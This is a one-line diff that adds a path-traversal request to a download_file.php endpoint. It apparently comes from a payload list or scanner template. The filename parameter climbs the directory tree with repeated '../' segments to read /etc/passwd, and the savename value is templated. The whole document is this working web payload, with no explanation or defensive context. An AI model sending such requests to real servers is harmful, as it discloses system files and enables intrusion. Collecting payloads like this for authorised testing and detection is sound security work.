@@ -1,0 +1,1 @@
+/view/action/download_file.php?filename=../../../../../../../../../etc/passwd&savename={{filename}}.txt
